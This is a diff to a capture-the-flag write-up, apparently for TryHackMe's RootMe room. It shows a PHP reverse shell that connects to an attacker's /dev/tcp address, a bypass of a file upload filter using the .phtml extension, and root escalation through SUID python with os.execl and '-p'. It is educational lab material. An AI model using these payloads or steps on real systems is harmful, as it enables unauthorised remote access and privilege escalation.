@@ -87,7 +87,7 @@ date: 2025-06-09
     <?php 
         $ip=***.***.***.***;
         $port=****;
-        shell_exec("/bin/bash -c 'bash -i &> /dev/tcp/$ip/$port 0>&1'");
+        shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
     ?>
     ```
     - I know this might not be intuitive, but trust me the more you do the ctf challenges, the more this will stick in your brain.
@@ -106,6 +106,103 @@ date: 2025-06-09
     - Preference(Sublime-text editor), you may use any that you comforatable with.
     - I have already explained the payload above.
     - But for the `port` you may use any port that is not in-use, the most common one is 1337.
+    - Initially i saved the file as `.php`, and when i uploaded the file i got the error below. 
+        ![stepic challenge](/assets/img/rootMe(13).PNG){: .writeup-image }
+        - We do not even have to translate, it's clear that the `php` extension is not permitted.
+        - We have to bypass that restriction. Hence, i this time around i saved the file as `php.txt`.
+        ![stepic challenge](/assets/img/rootMe(14).PNG){: .writeup-image }
+        - It was successfully uploaded. But as you can see below that, we not getting our reverse shell.
+        ![stepic challenge](/assets/img/rootMe(15).PNG){: .writeup-image }
+        - After many attempts, of changing the code and the extension, i finnaly discovered about this extension `.phtml`.This extension tells the server that the file has a combination of html and php code. 
+        ![stepic challenge](/assets/img/rootMe(16).PNG){: .writeup-image }
+        - Thus i was able to get a shell.
+    ![stepic challenge](/assets/img/rootMe(17).PNG){: .writeup-image }
+        - The highlighted command is as follows:
+        ```bash
+        find / -type f -name "user.txt"
+        ```
+        - `find`: It just finds what you want.
+        - `/`: This is the root directory, and we tell it to look all files from the root directory.
+        - `f`: file.
+        - `-name`: The name of the file.
+        - `""`: The pattern.
+        - Alternatively, for a cleaner output
+        ```
+        find / -type f -name "user.txt" 2>/dev/null
+        ```
+        - This will give you the output straight, without the all the errors shown.
+        - `2>/dev/null`: All i know is that the 2, represent the errors, and you redirect them to the specified directory. Meaning it will give only what you are looking for, for which in this case will be `/var/www/user.txt`.
+        - But i used the first command, which means you have to scroll up, until you find the directory without the `permission denied`. <br>
+    ![stepic challenge](/assets/img/rootMe(18).PNG){: .writeup-image }
+        - Then look at the contents:
+    ![stepic challenge](/assets/img/rootMe(19).PNG){: .writeup-image }
+        - With the following highlighted command:
+        ```bash
+        cat /var/www/user.txt
+        ```
+        - `cat`: used to view the contents of the file.
+
+## Privilege Escalation through SUID(set user ID):
+- Main objective, is to get a shell as a root.
+- The following command is used to search for files that require being executed as a root.
+- I forgot to highlight but, i will show the code below.
+    ![stepic challenge](/assets/img/rootMe(20).PNG){: .writeup-image }
+    - command:
+    ```bash
+    find / -type f -user root -perm -4000 2>/dev/null
+    ```
+        - `-user`: A user can be as a root or group or as department.
+        - `-perm`: short for permission.
+        - `4000`: refers to the SUID. <br>
+
+**Weird File?**
+- `/usr/bin/python`
+    - This is because python is just an intepreter, there is literally no or was no need to use it as a root.
+    - You can use python even if, you are not as root.
+    - Hence, we can use this to our advantage to get ourselves a root shell.
+
+**Escalating our privileges:**
+- Initially i tried with this python code, and i still do not understand why it is not working
+    ```python
+    /usr/bin/python -c 'import os; os.system("/bin/sh")'
+    ```
+    ![stepic challenge](/assets/img/rootMe(25).PNG){: .writeup-image }
+    - I was able to get a shell but not as root.
+    - The following command helps to see if you are root or not:
+    ```bash
+    whoami
+    ```
+- But then i went to our typical website: [GTFOBins](https://gtfobins.github.io/)
+    ![stepic challenge](/assets/img/rootMe(22).PNG){: .writeup-image }
+    - It is simple you just type python+suid. Then you should get the following:
+    ![stepic challenge](/assets/img/rootMe(23).PNG){: .writeup-image }
+    - You can copy and paste.
+    - Otherwise(in this case):
+    ```python
+    /usr/bin/python -c 'import os; os.execl("/bin/sh","sh","-p")'
+    ```
+        - `-c`: Tells python to execute the following code directly.
+        - `import os`: Library for system operations.
+        - `os.execl()`: Replaces the current process (python) with the new one (/bin/sh)
+        - `sh`: The program name(abitrary).
+        - `-p`: Makes the shell *preserve privileges*. <br>
+    - The following highlighted are the commands.
+![stepic challenge](/assets/img/rootMe(24).PNG){: .writeup-image }
+       
+
+
+
+
+
+
+
+
+     
+
+
+
+         
+
      
 
 
